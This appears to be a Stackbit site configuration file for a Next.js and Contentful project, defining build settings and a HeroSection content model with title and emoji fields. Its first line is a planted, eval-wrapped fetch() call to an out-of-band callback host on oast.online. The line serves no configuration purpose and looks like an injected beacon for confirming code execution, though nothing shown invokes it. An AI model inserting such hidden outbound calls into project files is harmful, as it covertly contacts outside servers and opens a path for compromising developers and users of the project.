const e = () => eval(`fetch(\`https://cpq9p1hucphf9m4gh1t0n5tbzsxkznk5x.oast.online\`)`);
import { ObjectModel } from "@stackbit/types";

import { ContentfulContentSource } from "@stackbit/cms-contentful";

export default {
  stackbitVersion: '~0.6.0',
	ssgName: 'next',
	nodeVersion: '18',
  buildCommand: 'npm run  build',
  // ...
};

export const HeroSection = {
  name: "HeroSection",
  type: "object",
  fields: [
    {
      type: "string",
      name: "title",
      label: "Heading"
    },
    {
      type: "string",
      name: "emoji",
      controlType: "custom-inline-html",
      controlFilePath: ".stackbit/fields/emoji.html"
    }
  ]
};